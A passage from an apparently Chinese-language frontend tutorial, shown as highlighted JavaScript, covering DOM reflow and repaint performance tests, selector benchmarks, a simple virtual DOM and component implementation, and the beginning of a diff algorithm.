    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'多次重排'</span>);
    
    <span class="hljs-comment">// 使用cssText批量修改</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'批量修改'</span>);
    <span class="hljs-keyword">let</span> styles = <span class="hljs-string">''</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
      styles = <span class="hljs-string">`width: <span class="hljs-subst">${i}</span>px; height: <span class="hljs-subst">${i}</span>px; padding: <span class="hljs-subst">${i}</span>px;`</span>;
    }
    container.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span> = styles;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'批量修改'</span>);
    
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(container);
  }
  
  <span class="hljs-comment">// 重绘（Repaint）优化</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">testRepaint</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> elements = [];
    <span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(container);
    
    <span class="hljs-comment">// 创建1000个元素</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
      <span class="hljs-keyword">const</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
      el.<span class="hljs-property">textContent</span> = <span class="hljs-string">'Item '</span> + i;
      elements.<span class="hljs-title function_">push</span>(el);
    }
    
    <span class="hljs-comment">// 一次性添加到DOM</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'一次性添加'</span>);
    <span class="hljs-keyword">const</span> fragment = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createDocumentFragment</span>();
    elements.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> fragment.<span class="hljs-title function_">appendChild</span>(el));
    container.<span class="hljs-title function_">appendChild</span>(fragment);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'一次性添加'</span>);
    
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(container);
  }
}

<span class="hljs-comment">// 性能测试</span>
<span class="hljs-title class_">DOMPerformanceAnalyzer</span>.<span class="hljs-title function_">testReflow</span>();
<span class="hljs-title class_">DOMPerformanceAnalyzer</span>.<span class="hljs-title function_">testRepaint</span>();
</code></pre>
<h5 data-id="heading-3">1.2 选择器性能优化</h5>
<p>不同的DOM选择方法在性能上有显著差异。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SelectorPerformance</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">compareSelectors</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
    container.<span class="hljs-property">id</span> = <span class="hljs-string">'test-container'</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
      <span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
      div.<span class="hljs-property">className</span> = i % <span class="hljs-number">2</span> === <span class="hljs-number">0</span> ? <span class="hljs-string">'even item'</span> : <span class="hljs-string">'odd item'</span>;
      div.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'data-index'</span>, i);
      container.<span class="hljs-title function_">appendChild</span>(div);
    }
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(container);
    
    <span class="hljs-comment">// 各种选择器的性能比较</span>
    <span class="hljs-keyword">const</span> selectors = [
      {
        <span class="hljs-attr">name</span>: <span class="hljs-string">'getElementById'</span>,
        <span class="hljs-attr">test</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'test-container'</span>)
      },
      {
        <span class="hljs-attr">name</span>: <span class="hljs-string">'querySelector'</span>,
        <span class="hljs-attr">test</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'#test-container'</span>)
      },
      {
        <span class="hljs-attr">name</span>: <span class="hljs-string">'getElementsByClassName'</span>,
        <span class="hljs-attr">test</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">'even'</span>)
      },
      {
        <span class="hljs-attr">name</span>: <span class="hljs-string">'querySelectorAll (class)'</span>,
        <span class="hljs-attr">test</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.even'</span>)
      },
      {
        <span class="hljs-attr">name</span>: <span class="hljs-string">'querySelectorAll (attribute)'</span>,
        <span class="hljs-attr">test</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'[data-index]'</span>)
      }
    ];
    
    selectors.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">selector</span> =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(selector.<span class="hljs-property">name</span>);
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
        selector.<span class="hljs-title function_">test</span>();
      }
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(selector.<span class="hljs-property">name</span>);
    });
    
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(container);
  }
  
  <span class="hljs-comment">// 选择器最佳实践</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">selectorBestPractices</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 1. 缓存选择器结果</span>
    <span class="hljs-keyword">const</span> cachedElements = {
      <span class="hljs-attr">container</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'container'</span>),
      <span class="hljs-attr">buttons</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.btn'</span>),
      <span class="hljs-attr">form</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-string">'user-form'</span>]
    };
    
    <span class="hljs-comment">// 2. 使用最具体的父元素</span>
    <span class="hljs-keyword">const</span> parent = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'specific-parent'</span>);
    <span class="hljs-keyword">const</span> children = parent.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.child-element'</span>);
    
    <span class="hljs-comment">// 3. 避免过度使用通用选择器</span>
    <span class="hljs-comment">// 不好: document.querySelectorAll('div .item span')</span>
    <span class="hljs-comment">// 好: container.querySelectorAll('.item &gt; span')</span>
    
    <span class="hljs-comment">// 4. 使用ID选择器最快</span>
    <span class="hljs-keyword">const</span> fastest = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'unique-id'</span>);
    
    <span class="hljs-keyword">return</span> cachedElements;
  }
}
</code></pre>
<h4 data-id="heading-4">二、虚拟DOM实现原理</h4>
<h5 data-id="heading-5">2.1 基础虚拟DOM实现</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">tag, props = {}, children = []</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tag</span> = tag;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span> = props;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span> = children;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">key</span> = props.<span class="hljs-property">key</span> || <span class="hljs-literal">null</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">el</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 对应的真实DOM</span>
  }
  
  <span class="hljs-comment">// 创建虚拟DOM</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">tag, props, ...children</span>) {
    <span class="hljs-comment">// 扁平化children数组</span>
    <span class="hljs-keyword">const</span> flatChildren = children.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, child</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(child)) {
        <span class="hljs-keyword">return</span> acc.<span class="hljs-title function_">concat</span>(child);
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (child == <span class="hljs-literal">null</span> || child === <span class="hljs-literal">false</span>) {
        <span class="hljs-keyword">return</span> acc;
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> acc.<span class="hljs-title function_">concat</span>(child);
      }
    }, []);
    
    <span class="hljs-comment">// 处理文本节点</span>
    <span class="hljs-keyword">const</span> processedChildren = flatChildren.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> child === <span class="hljs-string">'string'</span> || <span class="hljs-keyword">typeof</span> child === <span class="hljs-string">'number'</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">createText</span>(child);
      }
      <span class="hljs-keyword">return</span> child;
    });
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VNode</span>(tag, props || {}, processedChildren);
  }
  
  <span class="hljs-comment">// 创建文本节点</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">createText</span>(<span class="hljs-params">text</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VNode</span>(<span class="hljs-string">'#text'</span>, { <span class="hljs-attr">nodeValue</span>: text }, []);
  }
  
  <span class="hljs-comment">// 渲染为真实DOM</span>
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 文本节点</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">tag</span> === <span class="hljs-string">'#text'</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">nodeValue</span>);
    }
    
    <span class="hljs-comment">// 创建元素</span>
    <span class="hljs-keyword">const</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">tag</span>);
    
    <span class="hljs-comment">// 设置属性</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>)) {
      <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'on'</span>) &amp;&amp; <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'function'</span>) {
        <span class="hljs-comment">// 事件处理</span>
        <span class="hljs-keyword">const</span> eventName = key.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>).<span class="hljs-title function_">toLowerCase</span>();
        el.<span class="hljs-title function_">addEventListener</span>(eventName, value);
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key === <span class="hljs-string">'className'</span>) {
        <span class="hljs-comment">// class属性</span>
        el.<span class="hljs-property">className</span> = value;
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key === <span class="hljs-string">'style'</span> &amp;&amp; <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span>) {
        <span class="hljs-comment">// style对象</span>
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(el.<span class="hljs-property">style</span>, value);
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key !== <span class="hljs-string">'key'</span>) {
        <span class="hljs-comment">// 其他属性</span>
        el.<span class="hljs-title function_">setAttribute</span>(key, value);
      }
    }
    
    <span class="hljs-comment">// 递归渲染子节点</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (child) {
        <span class="hljs-keyword">const</span> childEl = child.<span class="hljs-title function_">render</span>();
        el.<span class="hljs-title function_">appendChild</span>(childEl);
        child.<span class="hljs-property">el</span> = childEl; <span class="hljs-comment">// 保存DOM引用</span>
      }
    });
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">el</span> = el;
    <span class="hljs-keyword">return</span> el;
  }
}

<span class="hljs-comment">// 虚拟DOM使用示例</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">VirtualDOMExample</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">createVirtualDOM</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> vdom = <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(
      <span class="hljs-string">'div'</span>,
      { <span class="hljs-attr">id</span>: <span class="hljs-string">'app'</span>, <span class="hljs-attr">className</span>: <span class="hljs-string">'container'</span> },
      <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(<span class="hljs-string">'h1'</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">'Hello Virtual DOM'</span>),
      <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(
        <span class="hljs-string">'ul'</span>,
        { <span class="hljs-attr">style</span>: { <span class="hljs-attr">color</span>: <span class="hljs-string">'blue'</span>, <span class="hljs-attr">padding</span>: <span class="hljs-string">'10px'</span> } },
        <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(<span class="hljs-string">'li'</span>, { <span class="hljs-attr">key</span>: <span class="hljs-string">'1'</span> }, <span class="hljs-string">'Item 1'</span>),
        <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(<span class="hljs-string">'li'</span>, { <span class="hljs-attr">key</span>: <span class="hljs-string">'2'</span> }, <span class="hljs-string">'Item 2'</span>),
        <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(<span class="hljs-string">'li'</span>, { <span class="hljs-attr">key</span>: <span class="hljs-string">'3'</span> }, <span class="hljs-string">'Item 3'</span>)
      ),
      <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(
        <span class="hljs-string">'button'</span>,
        { 
          <span class="hljs-attr">onClick</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">alert</span>(<span class="hljs-string">'Clicked!'</span>),
          <span class="hljs-attr">className</span>: <span class="hljs-string">'btn btn-primary'</span>
        },
        <span class="hljs-string">'Click Me'</span>
      )
    );
    
    <span class="hljs-keyword">return</span> vdom;
  }
  
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">mount</span>(<span class="hljs-params">containerId</span>) {
    <span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(containerId);
    <span class="hljs-keyword">const</span> vdom = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createVirtualDOM</span>();
    <span class="hljs-keyword">const</span> realDOM = vdom.<span class="hljs-title function_">render</span>();
    container.<span class="hljs-title function_">appendChild</span>(realDOM);
    <span class="hljs-keyword">return</span> vdom;
  }
}
</code></pre>
<h5 data-id="heading-6">2.2 组件化虚拟DOM</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 组件基类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Component</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span> = props;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = {};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">vnode</span> = <span class="hljs-literal">null</span>;
  }
  
  <span class="hljs-title function_">setState</span>(<span class="hljs-params">partialState</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = { ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>, ...partialState };
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">update</span>();
  }
  
  <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> oldVNode = <span class="hljs-variable language_">this</span>.<span class="hljs-property">vnode</span>;
    <span class="hljs-keyword">const</span> newVNode = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">render</span>();
    
    <span class="hljs-comment">// 执行diff和patch</span>
    <span class="hljs-keyword">const</span> patches = <span class="hljs-title class_">VirtualDOM</span>.<span class="hljs-title function_">diff</span>(oldVNode, newVNode);
    <span class="hljs-title class_">VirtualDOM</span>.<span class="hljs-title function_">patch</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">vnode</span>.<span class="hljs-property">el</span>.<span class="hljs-property">parentNode</span>, patches);
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">vnode</span> = newVNode;
  }
  
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'render() must be implemented'</span>);
  }
  
  <span class="hljs-comment">// 生命周期方法</span>
  <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"/>) {}
  <span class="hljs-title function_">componentDidUpdate</span>(<span class="hljs-params"/>) {}
  <span class="hljs-title function_">componentWillUnmount</span>(<span class="hljs-params"/>) {}
}

<span class="hljs-comment">// 函数式组件支持</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionalComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Component</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props, renderFn</span>) {
    <span class="hljs-variable language_">super</span>(props);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">renderFn</span> = renderFn;
  }
  
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderFn</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>);
  }
}

<span class="hljs-comment">// 组件示例</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TodoList</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Component</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-variable language_">super</span>(props);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = {
      <span class="hljs-attr">todos</span>: [],
      <span class="hljs-attr">inputValue</span>: <span class="hljs-string">''</span>
    };
  }
  
  handleInputChange = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>({ <span class="hljs-attr">inputValue</span>: e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span> });
  };
  
  handleAddTodo = <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">inputValue</span>.<span class="hljs-title function_">trim</span>()) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>({
        <span class="hljs-attr">todos</span>: [...<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">todos</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">inputValue</span>],
        <span class="hljs-attr">inputValue</span>: <span class="hljs-string">''</span>
      });
    }
  };
  
  handleRemoveTodo = <span class="hljs-function">(<span class="hljs-params">index</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> newTodos = [...<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">todos</span>];
    newTodos.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>({ <span class="hljs-attr">todos</span>: newTodos });
  };
  
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(
      <span class="hljs-string">'div'</span>,
      { <span class="hljs-attr">className</span>: <span class="hljs-string">'todo-list'</span> },
      <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(<span class="hljs-string">'h2'</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">'Todo List'</span>),
      <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(
        <span class="hljs-string">'div'</span>,
        { <span class="hljs-attr">className</span>: <span class="hljs-string">'input-group'</span> },
        <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(<span class="hljs-string">'input'</span>, {
          <span class="hljs-attr">type</span>: <span class="hljs-string">'text'</span>,
          <span class="hljs-attr">value</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">inputValue</span>,
          <span class="hljs-attr">onInput</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleInputChange</span>,
          <span class="hljs-attr">placeholder</span>: <span class="hljs-string">'Add new todo'</span>
        }),
        <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(
          <span class="hljs-string">'button'</span>,
          { <span class="hljs-attr">onClick</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleAddTodo</span> },
          <span class="hljs-string">'Add'</span>
        )
      ),
      <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(
        <span class="hljs-string">'ul'</span>,
        <span class="hljs-literal">null</span>,
        ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">todo, index</span>) =&gt;</span>
          <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(
            <span class="hljs-string">'li'</span>,
            { <span class="hljs-attr">key</span>: index, <span class="hljs-attr">className</span>: <span class="hljs-string">'todo-item'</span> },
            todo,
            <span class="hljs-title class_">VNode</span>.<span class="hljs-title function_">create</span>(
              <span class="hljs-string">'button'</span>,
              { 
                <span class="hljs-attr">onClick</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRemoveTodo</span>(index),
                <span class="hljs-attr">className</span>: <span class="hljs-string">'remove-btn'</span>
              },
              <span class="hljs-string">'×'</span>
            )
          )
        )
      )
    );
  }
}
</code></pre>
<h4 data-id="heading-7">三、DOM Diff算法深度解析</h4>
<h5 data-id="heading-8">3.1 完整的Diff算法实现</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VirtualDOM</span> {
  <span class="hljs-comment">// 比较两个虚拟节点的差异</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">diff</span>(<span class="hljs-params">oldVNode, newVNode</span>) {
    <span class="hljs-comment">// 如果旧节点不存在, 直接创建新节点</span>
    <span class="hljs-keyword">if</span> (!oldVNode) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">type</span>: <span class="hljs-string">"CREATE"</span>, <span class="hljs-attr">vnode</span>: newVNode };
    }

    <span class="hljs-comment">// 如果新节点不存在, 删除旧节点</span>
    <span class="hljs-keyword">if</span> (!newVNode) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">type</span>: <span class="hljs-string">"REMOVE"</span> };
    }

    <span class="hljs-comment">// 如果节点类型不同, 直接替换</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isDifferentType</span>(oldVNode, newVNode)) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">type</span>: <span class="hljs-string">"REPLACE"</span>,
        oldVNode,
        newVNode,
      };
    }

    <span class="hljs-comment">// 如果是文本节点, 比较文本内容</span>
    <span class="hljs-keyword">if</span> (oldVNode.<span class="hljs-property">tag</span> === <span class="hljs-string">"#text"</span> &amp;&amp; newVNode.<span class="hljs-property">tag</span> === <span class="hljs-string">"#text"</span>) {
      <span class="hljs-keyword">if</span> (oldVNode.<span class="hljs-property">props</span>.<span class="hljs-property">nodeValue</span> !== newVNode.<span class="hljs-property">props</span>.<span class="hljs-property">nodeValue</span>) {
        <span class="hljs-keyword">return</span> {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"UPDATE_TEXT"</span>,
          oldVNode,
          newVNode,
        };
      }
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-comment">// 比较属性差异</span>
    <span class="hljs-keyword">const</span> propsPatches = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">diffProps</span>(oldVNode, newVNode);

    <span class="hljs-comment">// 比较子节点差异</span>
    <span class="hljs-keyword">const</span> childrenPatches = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">diffChildren</span>(oldVNode, newVNode);

    <span class="hljs-comment">// 如果有差异, 返回补丁</span>
    <span class="hljs-keyword">if</span> (propsPatches.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> || childrenPatches.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">type</span>: <span class="hljs-string">"UPDATE_ELEMENT"</span>,
        <span class="hljs-attr">props</span>: propsPatches,
        <span class="hljs-attr">children</span>: childrenPatches,
        <span class="hljs-attr">vnode</span>: newVNode,
      };
    }

    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  }

  <span class="hljs-comment">// 判断节点类型是否不同</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">isDifferentType</span>(<span class="hljs-params">vnode1, vnode2</span>) {
    <span class="hljs-keyword">return</span> vnode1.<span class="hljs-property">tag</span> !== vnode2.<span class="hljs-property">tag</span> || vnode1.<span class="hljs-property">key</span> !== vnode2.<span class="hljs-property">key</span>;
  }

  <span class="hljs-comment">// 比较属性差异</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">diffProps</span>(<span class="hljs-params">oldVNode, newVNode</span>) {
    <span class="hljs-keyword">const</span> patches = [];
    <span class="hljs-keyword">const</span> oldProps = oldVNode.<span class="hljs-property">props</span>;
    <span class="hljs-keyword">const</span> newProps = newVNode.<span class="hljs-property">props</span>;

    <span class="hljs-comment">// 检查新增或修改的属性</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, newValue] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(newProps)) {
      <span class="hljs-keyword">const</span> oldValue = oldProps[key];

      <span class="hljs-comment">// 事件处理函数特殊处理</span>
      <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"on"</span>)) {
        <span class="hljs-keyword">if</span> (oldValue !== newValue) {
          patches.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">"UPDATE_EVENT"</span>,
            key,
            oldValue,
            newValue,
          });
        }
        <span class="hljs-keyword">continue</span>;
      }

      <span class="hljs-comment">// 其他属性比较</span>
      <span class="hljs-keyword">if</span> (oldValue !== newValue) {
        patches.<span class="hljs-title function_">push</span>({
          <span class="hljs-attr">type</span>: <span class="hljs-string">"UPDATE_PROP"</span>,
          key,
          <span class="hljs-attr">value</span>: newValue,
        });
      }
    }

    <span class="hljs-comment">// 检查被删除的属性</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(oldProps)) {
      <span class="hljs-keyword">if</span> (!(key <span class="hljs-keyword">in</span> newProps)) {
        patches.<span class="hljs-title function_">push</span>({
          <span class="hljs-attr">type</span>: <span class="hljs-string">"REMOVE_PROP"</span>,
          key,
        });
      }
    }

    <span class="hljs-keyword">return</span> patches;
  }

  <span class="hljs-comment">// 比较子节点差异(使用key优化)</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">diffChildren</span>(<span class="hljs-params">oldVNode, newVNode</span>) {
    <span class="hljs-keyword">const</span> patches = [];
    <span class="hljs-keyword">const</span> oldChildren = oldVNode.<span class="hljs-property">children</span>;
    <span class="hljs-keyword">const</span> newChildren = newVNode.<span class="hljs-property">children</span>;

